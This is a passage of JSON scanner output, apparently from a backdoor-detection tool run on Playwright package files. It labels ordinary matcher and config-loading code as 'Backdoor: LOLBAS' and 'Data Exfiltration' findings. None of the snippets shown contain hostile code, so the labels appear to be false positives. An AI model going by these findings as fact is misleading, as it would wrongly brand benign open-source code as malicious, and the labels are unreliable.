            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 118,
                  "startColumn": 5,
                  "endLine": 119,
                  "snippet": {
                    "text": "  return _toBeTruthy.toBeTruthy.call(this, 'toBeEnabled', locator, 'Locator', expected, unexpected, arg, async (isNot, timeout) => {\n    return await locator._expect(enabled ? 'to.be.enabled' : 'to.be.disabled', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeFocused(locator, options) {\n",
                    "rendered": {
                      "text": "  return _toBeTruthy.toBeTruthy.call(this, 'toBeEnabled', locator, 'Locator', expected, unexpected, arg, async (isNot, timeout) => {\n    return await locator._expect(enabled ? 'to.be.enabled' : 'to.be.disabled', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeFocused(locator, options) {\n",
                      "markdown": "`  return _toBeTruthy.toBeTruthy.call(this, 'toBeEnabled', locator, 'Locator', expected, unexpected, arg, async (isNot, timeout) => {\n    return await locator._expect(enabled ? 'to.be.enabled' : 'to.be.disabled', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeFocused(locator, options) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 106,
                  "startColumn": 5,
                  "endLine": 107,
                  "snippet": {
                    "text": "  return _toBeTruthy.toBeTruthy.call(this, 'toBeEmpty', locator, 'Locator', 'empty', 'notEmpty', '', async (isNot, timeout) => {\n    return await locator._expect('to.be.empty', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeEnabled(locator, options) {\n",
                    "rendered": {
                      "text": "  return _toBeTruthy.toBeTruthy.call(this, 'toBeEmpty', locator, 'Locator', 'empty', 'notEmpty', '', async (isNot, timeout) => {\n    return await locator._expect('to.be.empty', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeEnabled(locator, options) {\n",
                      "markdown": "`  return _toBeTruthy.toBeTruthy.call(this, 'toBeEmpty', locator, 'Locator', 'empty', 'notEmpty', '', async (isNot, timeout) => {\n    return await locator._expect('to.be.empty', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeEnabled(locator, options) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 98,
                  "startColumn": 5,
                  "endLine": 99,
                  "snippet": {
                    "text": "  return _toBeTruthy.toBeTruthy.call(this, 'toBeEditable', locator, 'Locator', expected, unexpected, arg, async (isNot, timeout) => {\n    return await locator._expect(editable ? 'to.be.editable' : 'to.be.readonly', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeEmpty(locator, options) {\n",
                    "rendered": {
                      "text": "  return _toBeTruthy.toBeTruthy.call(this, 'toBeEditable', locator, 'Locator', expected, unexpected, arg, async (isNot, timeout) => {\n    return await locator._expect(editable ? 'to.be.editable' : 'to.be.readonly', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeEmpty(locator, options) {\n",
                      "markdown": "`  return _toBeTruthy.toBeTruthy.call(this, 'toBeEditable', locator, 'Locator', expected, unexpected, arg, async (isNot, timeout) => {\n    return await locator._expect(editable ? 'to.be.editable' : 'to.be.readonly', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeEmpty(locator, options) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 86,
                  "startColumn": 5,
                  "endLine": 87,
                  "snippet": {
                    "text": "  return _toBeTruthy.toBeTruthy.call(this, 'toBeDisabled', locator, 'Locator', 'disabled', 'enabled', '', async (isNot, timeout) => {\n    return await locator._expect('to.be.disabled', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeEditable(locator, options) {\n",
                    "rendered": {
                      "text": "  return _toBeTruthy.toBeTruthy.call(this, 'toBeDisabled', locator, 'Locator', 'disabled', 'enabled', '', async (isNot, timeout) => {\n    return await locator._expect('to.be.disabled', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeEditable(locator, options) {\n",
                      "markdown": "`  return _toBeTruthy.toBeTruthy.call(this, 'toBeDisabled', locator, 'Locator', 'disabled', 'enabled', '', async (isNot, timeout) => {\n    return await locator._expect('to.be.disabled', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeEditable(locator, options) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 78,
                  "startColumn": 5,
                  "endLine": 79,
                  "snippet": {
                    "text": "  return _toBeTruthy.toBeTruthy.call(this, 'toBeChecked', locator, 'Locator', expected, unexpected, arg, async (isNot, timeout) => {\n    return await locator._expect(checked ? 'to.be.checked' : 'to.be.unchecked', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeDisabled(locator, options) {\n",
                    "rendered": {
                      "text": "  return _toBeTruthy.toBeTruthy.call(this, 'toBeChecked', locator, 'Locator', expected, unexpected, arg, async (isNot, timeout) => {\n    return await locator._expect(checked ? 'to.be.checked' : 'to.be.unchecked', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeDisabled(locator, options) {\n",
                      "markdown": "`  return _toBeTruthy.toBeTruthy.call(this, 'toBeChecked', locator, 'Locator', expected, unexpected, arg, async (isNot, timeout) => {\n    return await locator._expect(checked ? 'to.be.checked' : 'to.be.unchecked', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeDisabled(locator, options) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 5,
                  "endLine": 67,
                  "snippet": {
                    "text": "  return _toBeTruthy.toBeTruthy.call(this, 'toBeAttached', locator, 'Locator', expected, unexpected, arg, async (isNot, timeout) => {\n    return await locator._expect(attached ? 'to.be.attached' : 'to.be.detached', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeChecked(locator, options) {\n",
                    "rendered": {
                      "text": "  return _toBeTruthy.toBeTruthy.call(this, 'toBeAttached', locator, 'Locator', expected, unexpected, arg, async (isNot, timeout) => {\n    return await locator._expect(attached ? 'to.be.attached' : 'to.be.detached', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeChecked(locator, options) {\n",
                      "markdown": "`  return _toBeTruthy.toBeTruthy.call(this, 'toBeAttached', locator, 'Locator', expected, unexpected, arg, async (isNot, timeout) => {\n    return await locator._expect(attached ? 'to.be.attached' : 'to.be.detached', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeChecked(locator, options) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/toBeTruthy.js"
                },
                "region": {
                  "startLine": 53,
                  "startColumn": 23,
                  "endLine": 53,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    name: matcherName,\n    expected,\n    log,\n    timeout: timedOut ? timeout : undefined\n  };\n}",
                    "rendered": {
                      "text": "    name: matcherName,\n    expected,\n    log,\n    timeout: timedOut ? timeout : undefined\n  };\n}",
                      "markdown": "`    name: matcherName,\n    expected,\n    log,\n    timeout: timedOut ? timeout : undefined\n  };\n}`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/toBeTruthy.js"
                },
                "region": {
                  "startLine": 42,
                  "startColumn": 120,
                  "endLine": 42,
                  "endColumn": 129,
                  "snippet": {
                    "text": "t, timeout);\n  const notFound = received === _matcherHint.kNoElementsFoundError ? received : undefined;\n  const actual = matches ? expected : unexpected;\n  const message = () => {\n    const header = (0, _matcherHint.matcherHint)(this, receiver, matcherName, 'locator', arg, matcherOptions, timedOut ? timeout : undefined);\n    const logText = (0, _util.callLogText)(log);\n    return matches ? `${header}Expected: not ${expected}\\nReceived: ${notFound ? _matcherHint.kNoElementsFoundError : expected}${logText}` : `${header}Expected: ${expected}\\nReceived: ${notFound ? _matcherHint.kNoElementsFoundError : une",
                    "rendered": {
                      "text": "t, timeout);\n  const notFound = received === _matcherHint.kNoElementsFoundError ? received : undefined;\n  const actual = matches ? expected : unexpected;\n  const message = () => {\n    const header = (0, _matcherHint.matcherHint)(this, receiver, matcherName, 'locator', arg, matcherOptions, timedOut ? timeout : undefined);\n    const logText = (0, _util.callLogText)(log);\n    return matches ? `${header}Expected: not ${expected}\\nReceived: ${notFound ? _matcherHint.kNoElementsFoundError : expected}${logText}` : `${header}Expected: ${expected}\\nReceived: ${notFound ? _matcherHint.kNoElementsFoundError : une",
                      "markdown": "`t, timeout);\n  const notFound = received === _matcherHint.kNoElementsFoundError ? received : undefined;\n  const actual = matches ? expected : unexpected;\n  const message = () => {\n    const header = (0, _matcherHint.matcherHint)(this, receiver, matcherName, 'locator', arg, matcherOptions, timedOut ? timeout : undefined);\n    const logText = (0, _util.callLogText)(log);\n    return matches ? `${header}Expected: not ${expected}\\nReceived: ${notFound ? _matcherHint.kNoElementsFoundError : expected}${logText}` : `${header}Expected: ${expected}\\nReceived: ${notFound ? _matcherHint.kNoElementsFoundError : une`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/toBeTruthy.js"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 7,
                  "endLine": 32,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    isNot: this.isNot,\n    promise: this.promise\n  };\n  const timeout = (_options$timeout = options.timeout) !== null && _options$timeout !== void 0 ? _options$timeout : this.timeout;\n  const {\n    matches,\n    log,\n",
                    "rendered": {
                      "text": "    isNot: this.isNot,\n    promise: this.promise\n  };\n  const timeout = (_options$timeout = options.timeout) !== null && _options$timeout !== void 0 ? _options$timeout : this.timeout;\n  const {\n    matches,\n    log,\n",
                      "markdown": "`    isNot: this.isNot,\n    promise: this.promise\n  };\n  const timeout = (_options$timeout = options.timeout) !== null && _options$timeout !== void 0 ? _options$timeout : this.timeout;\n  const {\n    matches,\n    log,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/toEqual.js"
                },
                "region": {
                  "startLine": 55,
                  "startColumn": 23,
                  "endLine": 55,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    name: matcherName,\n    pass,\n    log,\n    timeout: timedOut ? timeout : undefined\n  };\n}",
                    "rendered": {
                      "text": "    name: matcherName,\n    pass,\n    log,\n    timeout: timedOut ? timeout : undefined\n  };\n}",
                      "markdown": "`    name: matcherName,\n    pass,\n    log,\n    timeout: timedOut ? timeout : undefined\n  };\n}`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/toEqual.js"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 415,
                  "endLine": 43,
                  "endColumn": 424,
                  "snippet": {
                    "text": "cherOptions, timedOut ? timeout : undefined) + `Expected: not ${this.utils.printExpected(expected)}\\n` + `Received: ${this.utils.printReceived(received)}` + (0, _util.callLogText)(log) : () => (0, _matcherHint.matcherHint)(this, receiver, matcherName, 'locator', undefined, matcherOptions, timedOut ? timeout : undefined) + this.utils.printDiffOrStringify(expected, received, EXPECTED_LABEL, RECEIVED_LABEL, false) + (0, _util.callLogText)(log);\n\n  // Passing the actual and expected objects so that a custom reporter\n  // could access them, for example in order to display a custom visual diff,\n  // or creat",
                    "rendered": {
                      "text": "cherOptions, timedOut ? timeout : undefined) + `Expected: not ${this.utils.printExpected(expected)}\\n` + `Received: ${this.utils.printReceived(received)}` + (0, _util.callLogText)(log) : () => (0, _matcherHint.matcherHint)(this, receiver, matcherName, 'locator', undefined, matcherOptions, timedOut ? timeout : undefined) + this.utils.printDiffOrStringify(expected, received, EXPECTED_LABEL, RECEIVED_LABEL, false) + (0, _util.callLogText)(log);\n\n  // Passing the actual and expected objects so that a custom reporter\n  // could access them, for example in order to display a custom visual diff,\n  // or creat",
                      "markdown": "`cherOptions, timedOut ? timeout : undefined) + `Expected: not ${this.utils.printExpected(expected)}\\n` + `Received: ${this.utils.printReceived(received)}` + (0, _util.callLogText)(log) : () => (0, _matcherHint.matcherHint)(this, receiver, matcherName, 'locator', undefined, matcherOptions, timedOut ? timeout : undefined) + this.utils.printDiffOrStringify(expected, received, EXPECTED_LABEL, RECEIVED_LABEL, false) + (0, _util.callLogText)(log);\n\n  // Passing the actual and expected objects so that a custom reporter\n  // could access them, for example in order to display a custom visual diff,\n  // or creat`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/toEqual.js"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 138,
                  "endLine": 43,
                  "endColumn": 147,
                  "snippet": {
                    "text": "$timeout !== void 0 ? _options$timeout : this.timeout;\n  const {\n    matches: pass,\n    received,\n    log,\n    timedOut\n  } = await query(!!this.isNot, timeout);\n  const message = pass ? () => (0, _matcherHint.matcherHint)(this, receiver, matcherName, 'locator', undefined, matcherOptions, timedOut ? timeout : undefined) + `Expected: not ${this.utils.printExpected(expected)}\\n` + `Received: ${this.utils.printReceived(received)}` + (0, _util.callLogText)(log) : () => (0, _matcherHint.matcherHint)(this, receiver, matcherName, 'locator', undefined, matcherOptions, timedOut ? timeout : undefined) + this.uti",
                    "rendered": {
                      "text": "$timeout !== void 0 ? _options$timeout : this.timeout;\n  const {\n    matches: pass,\n    received,\n    log,\n    timedOut\n  } = await query(!!this.isNot, timeout);\n  const message = pass ? () => (0, _matcherHint.matcherHint)(this, receiver, matcherName, 'locator', undefined, matcherOptions, timedOut ? timeout : undefined) + `Expected: not ${this.utils.printExpected(expected)}\\n` + `Received: ${this.utils.printReceived(received)}` + (0, _util.callLogText)(log) : () => (0, _matcherHint.matcherHint)(this, receiver, matcherName, 'locator', undefined, matcherOptions, timedOut ? timeout : undefined) + this.uti",
                      "markdown": "`$timeout !== void 0 ? _options$timeout : this.timeout;\n  const {\n    matches: pass,\n    received,\n    log,\n    timedOut\n  } = await query(!!this.isNot, timeout);\n  const message = pass ? () => (0, _matcherHint.matcherHint)(this, receiver, matcherName, 'locator', undefined, matcherOptions, timedOut ? timeout : undefined) + `Expected: not ${this.utils.printExpected(expected)}\\n` + `Received: ${this.utils.printReceived(received)}` + (0, _util.callLogText)(log) : () => (0, _matcherHint.matcherHint)(this, receiver, matcherName, 'locator', undefined, matcherOptions, timedOut ? timeout : undefined) + this.uti`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/toEqual.js"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 7,
                  "endLine": 36,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    isNot: this.isNot,\n    promise: this.promise\n  };\n  const timeout = (_options$timeout = options.timeout) !== null && _options$timeout !== void 0 ? _options$timeout : this.timeout;\n  const {\n    matches: pass,\n    received,\n",
                    "rendered": {
                      "text": "    isNot: this.isNot,\n    promise: this.promise\n  };\n  const timeout = (_options$timeout = options.timeout) !== null && _options$timeout !== void 0 ? _options$timeout : this.timeout;\n  const {\n    matches: pass,\n    received,\n",
                      "markdown": "`    isNot: this.isNot,\n    promise: this.promise\n  };\n  const timeout = (_options$timeout = options.timeout) !== null && _options$timeout !== void 0 ? _options$timeout : this.timeout;\n  const {\n    matches: pass,\n    received,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/expect.js"
                },
                "region": {
                  "startLine": 290,
                  "startColumn": 5,
                  "endLine": 290,
                  "endColumn": 13,
                  "snippet": {
                    "text": "  if (matcherName === 'toHaveScreenshot') value = (0, _toMatchSnapshot.toHaveScreenshotStepTitle)(...args);\n  return value ? `(${value})` : '';\n}\nconst expect = exports.expect = createExpect({}).extend(customMatchers);\nfunction mergeExpects(...expects) {\n  return expect;\n}",
                    "rendered": {
                      "text": "  if (matcherName === 'toHaveScreenshot') value = (0, _toMatchSnapshot.toHaveScreenshotStepTitle)(...args);\n  return value ? `(${value})` : '';\n}\nconst expect = exports.expect = createExpect({}).extend(customMatchers);\nfunction mergeExpects(...expects) {\n  return expect;\n}",
                      "markdown": "`  if (matcherName === 'toHaveScreenshot') value = (0, _toMatchSnapshot.toHaveScreenshotStepTitle)(...args);\n  return value ? `(${value})` : '';\n}\nconst expect = exports.expect = createExpect({}).extend(customMatchers);\nfunction mergeExpects(...expects) {\n  return expect;\n}`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/expect.js"
                },
                "region": {
                  "startLine": 176,
                  "startColumn": 25,
                  "endLine": 176,
                  "endColumn": 30,
                  "snippet": {
                    "text": "    };\n  }\n  get(target, matcherName, receiver) {\n    let matcher = Reflect.get(target, matcherName, receiver);\n    if (typeof matcherName !== 'string') return matcher;\n    if (matcher === undefined) throw new Error(`expect: Property '${matcherName}' not found.`);\n    if (typeof matcher !== 'function') {\n",
                    "rendered": {
                      "text": "    };\n  }\n  get(target, matcherName, receiver) {\n    let matcher = Reflect.get(target, matcherName, receiver);\n    if (typeof matcherName !== 'string') return matcher;\n    if (matcher === undefined) throw new Error(`expect: Property '${matcherName}' not found.`);\n    if (typeof matcher !== 'function') {\n",
                      "markdown": "`    };\n  }\n  get(target, matcherName, receiver) {\n    let matcher = Reflect.get(target, matcherName, receiver);\n    if (typeof matcherName !== 'string') return matcher;\n    if (matcher === undefined) throw new Error(`expect: Property '${matcherName}' not found.`);\n    if (typeof matcher !== 'function') {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/toMatchSnapshot.js"
                },
                "region": {
                  "startLine": 311,
                  "startColumn": 116,
                  "endLine": 311,
                  "endColumn": 120,
                  "snippet": {
                    "text": "  }\n\n  // Fast path: there's no screenshot and we don't intend to update it.\n  if (helper.updateSnapshots === 'none' && !hasSnapshot) return helper.createMatcherResult(`A snapshot doesn't exist at ${helper.snapshotPath}.`, false);\n  if (!hasSnapshot) {\n    // Regenerate a new screenshot by waiting until two screenshots are the same.\n    const {\n",
                    "rendered": {
                      "text": "  }\n\n  // Fast path: there's no screenshot and we don't intend to update it.\n  if (helper.updateSnapshots === 'none' && !hasSnapshot) return helper.createMatcherResult(`A snapshot doesn't exist at ${helper.snapshotPath}.`, false);\n  if (!hasSnapshot) {\n    // Regenerate a new screenshot by waiting until two screenshots are the same.\n    const {\n",
                      "markdown": "`  }\n\n  // Fast path: there's no screenshot and we don't intend to update it.\n  if (helper.updateSnapshots === 'none' && !hasSnapshot) return helper.createMatcherResult(`A snapshot doesn't exist at ${helper.snapshotPath}.`, false);\n  if (!hasSnapshot) {\n    // Regenerate a new screenshot by waiting until two screenshots are the same.\n    const {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/toMatchSnapshot.js"
                },
                "region": {
                  "startLine": 167,
                  "startColumn": 45,
                  "endLine": 167,
                  "endColumn": 49,
                  "snippet": {
                    "text": "        path: this.actualPath\n      });\n    }\n    const message = `A snapshot doesn't exist at ${this.snapshotPath}${isWriteMissingMode ? ', writing actual.' : '.'}`;\n    if (this.updateSnapshots === 'all') {\n      /* eslint-disable no-console */\n      console.log(message);\n",
                    "rendered": {
                      "text": "        path: this.actualPath\n      });\n    }\n    const message = `A snapshot doesn't exist at ${this.snapshotPath}${isWriteMissingMode ? ', writing actual.' : '.'}`;\n    if (this.updateSnapshots === 'all') {\n      /* eslint-disable no-console */\n      console.log(message);\n",
                      "markdown": "`        path: this.actualPath\n      });\n    }\n    const message = `A snapshot doesn't exist at ${this.snapshotPath}${isWriteMissingMode ? ', writing actual.' : '.'}`;\n    if (this.updateSnapshots === 'all') {\n      /* eslint-disable no-console */\n      console.log(message);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/toMatchSnapshot.js"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 45,
                  "endLine": 143,
                  "endColumn": 49,
                  "snippet": {
                    "text": "  }\n  handleMissingNegated() {\n    const isWriteMissingMode = this.updateSnapshots === 'all' || this.updateSnapshots === 'missing';\n    const message = `A snapshot doesn't exist at ${this.snapshotPath}${isWriteMissingMode ? ', matchers using \".not\" won\\'t write them automatically.' : '.'}`;\n    // NOTE: 'isNot' matcher implies inversed value.\n    return this.createMatcherResult(message, true);\n  }\n",
                    "rendered": {
                      "text": "  }\n  handleMissingNegated() {\n    const isWriteMissingMode = this.updateSnapshots === 'all' || this.updateSnapshots === 'missing';\n    const message = `A snapshot doesn't exist at ${this.snapshotPath}${isWriteMissingMode ? ', matchers using \".not\" won\\'t write them automatically.' : '.'}`;\n    // NOTE: 'isNot' matcher implies inversed value.\n    return this.createMatcherResult(message, true);\n  }\n",
                      "markdown": "`  }\n  handleMissingNegated() {\n    const isWriteMissingMode = this.updateSnapshots === 'all' || this.updateSnapshots === 'missing';\n    const message = `A snapshot doesn't exist at ${this.snapshotPath}${isWriteMissingMode ? ', matchers using \".not\" won\\'t write them automatically.' : '.'}`;\n    // NOTE: 'isNot' matcher implies inversed value.\n    return this.createMatcherResult(message, true);\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/third_party/tsconfig-loader.js"
                },
                "region": {
                  "startLine": 86,
                  "startColumn": 49,
                  "endLine": 86,
                  "endColumn": 54,
                  "snippet": {
                    "text": "}\nfunction loadTsConfig(configFilePath, references, visited = new Map()) {\n  var _parsedConfig$compile, _parsedConfig$compile2, _parsedConfig$compile3;\n  if (visited.has(configFilePath)) return visited.get(configFilePath);\n  let result = {\n    tsConfigPath: configFilePath\n  };\n",
                    "rendered": {
                      "text": "}\nfunction loadTsConfig(configFilePath, references, visited = new Map()) {\n  var _parsedConfig$compile, _parsedConfig$compile2, _parsedConfig$compile3;\n  if (visited.has(configFilePath)) return visited.get(configFilePath);\n  let result = {\n    tsConfigPath: configFilePath\n  };\n",
                      "markdown": "`}\nfunction loadTsConfig(configFilePath, references, visited = new Map()) {\n  var _parsedConfig$compile, _parsedConfig$compile2, _parsedConfig$compile3;\n  if (visited.has(configFilePath)) return visited.get(configFilePath);\n  let result = {\n    tsConfigPath: configFilePath\n  };\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/third_party/tsconfig-loader.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 233,
                  "endLine": 12,
                  "endColumn": 238,
                  "snippet": {
